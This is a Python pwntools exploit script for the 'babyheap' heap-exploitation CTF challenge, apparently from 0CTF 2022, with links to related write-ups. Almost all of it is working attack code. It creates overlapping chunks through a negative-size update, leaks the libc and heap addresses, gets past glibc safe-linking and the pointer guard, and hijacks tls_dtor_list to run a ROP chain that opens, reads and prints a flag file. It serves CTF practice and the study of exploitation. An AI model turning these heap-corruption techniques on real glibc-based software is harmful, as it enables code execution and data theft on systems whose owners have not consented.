#!/usr/bin/env python3
from pwn import *

elf = ELF("./babyheap")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
if args.LOCAL:
    p = elf.process()
    if args.GDB:
        context.update(binary=elf, log_level="DEBUG")
        gdb.attach(
            p,
            """
            breakrva *0x1d19
            breakrva *0x1d27
            breakrva *0x1d35
            breakrva *0x1d43
            breakrva *0x1d4a
            """,
        )
else:
    p = remote("", "")


def Allocate(size, content):
    p.sendlineafter(b"Command: ", b"1")
    p.sendlineafter(b"Size: ", str(int(size)).encode())
    p.sendlineafter(b"Content: ", content)
    return


def Update(idx, size, content):
    p.sendlineafter(b"Command: ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(int(size)).encode())
    p.sendlineafter(b"Content: ", content)
    return


def Delete(idx):
    p.sendlineafter(b"Command: ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())
    return


def View(idx):
    p.sendlineafter(b"Command: ", b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())
    return


def Exit():
    p.sendlineafter(b"Command: ", b"5")
    return


###################################
### Stage 1: Overlapping chunks ###
###################################
Allocate(0x18, b"0" * 8)
Allocate(0x4F8, b"1" * 8)
Allocate(0x18, b"2" * 8)
Allocate(0x4F8, b"3" * 8)
Allocate(0x18, b"4" * 8)

payload = flat(0, 0, 0, 0x521)
Update(0, -1, payload)
Delete(1)
Delete(3)

##################################
### Stage 2: Leak libc address ###
##################################
Allocate(0x4F8, b"1" * 8)
View(2)
p.recvuntil(b"Chunk[2]: ")
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x219CE0
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))

##################################
### Stage 3: Leak heap address ###
##################################
Allocate(0x18, b"3" * 8)
Delete(3)
View(2)
p.recvuntil(b"Chunk[2]: ")
heap_leak = u64(p.recv(8))
heap = heap_leak << 12
log.info("Heap leak: " + hex(heap_leak))
log.info("Heap base: " + hex(heap))

########################################
### Stage 4: __call_tls_dtors attack ###
########################################
### Stage 4.1: Clear __pointer_chk_guard_local
### https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86_64/sysdep.h#L394
Allocate(0x18, b"3" * 8)
Delete(4)
Delete(3)  # Overlapping index 2
payload = flat(
    # Bypass safe linking
    ((heap + 0x7C0) >> 12)
    ^ (libc.symbols["fs"] + 0x30)
)
Update(2, 0x18, payload)

Allocate(0x18, b"3" * 8)
Allocate(0x18, b"\x00" * 8 + b"4" * 8)  # The 8-byte '4' is note for index

### Stage 4.2: Create fake tls_dtor_list
### https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_thread_atexit_impl.c#L148
mov_rsp_rdx = libc.address + 0x000000000005A170
pop_rdi = libc.address + 0x000000000002A3E5
pop_rsi = libc.address + 0x000000000002BE51
pop_rdx_rbx = libc.address + 0x0000000000090529
pop_rax = libc.address + 0x0000000000045EB0
syscall = libc.address + 0x91396


def left_rotate(data, bit):
    return (data << bit) | (data >> (64 - bit))


### Create fake dtor_list
payload = flat(
    left_rotate(mov_rsp_rdx, 0x11),
    0,
    0,
    heap + 0x800,
    # open("flag", 0, 0)
    pop_rax,
    2,
    pop_rdi,
    heap + 0x7C0,
    pop_rsi,
    0,
    pop_rdx_rbx,
    0,
    0,
    syscall,
    # read(3, heap+0x7c0, 0x100)
    pop_rax,
    0,
    pop_rdi,
    3,
    pop_rsi,
    heap + 0x7C0,
    pop_rdx_rbx,
    0x100,
    0,
    syscall,
    # write(1, heap+0x7c0, 0x100)
    pop_rax,
    1,
    pop_rdi,
    1,
    syscall,
)
Allocate(0x4F8, payload)

### Overwrite tls_dtor_list
Allocate(0x18, b"6" * 8)
Delete(6)
Delete(3)
payload = flat(((heap + 0x7C0) >> 12) ^ (libc.symbols["fs"] - 0x60))
Update(2, 0x18, payload)

Allocate(0x18, b"flag\0\0\0\0")
Allocate(0x18, b"6" * 8 + p64(heap + 0x7E0))

Exit()

p.interactive()

# https://github.com/nhtri2003gmail/CTFWriteup/tree/master/2022/0CTF-2022/BabyHeap-2022
# https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html
# https://jkrshnmenon.github.io/blog/2023/0ctf22ezvm/
# https://ctftime.org/writeup/35597
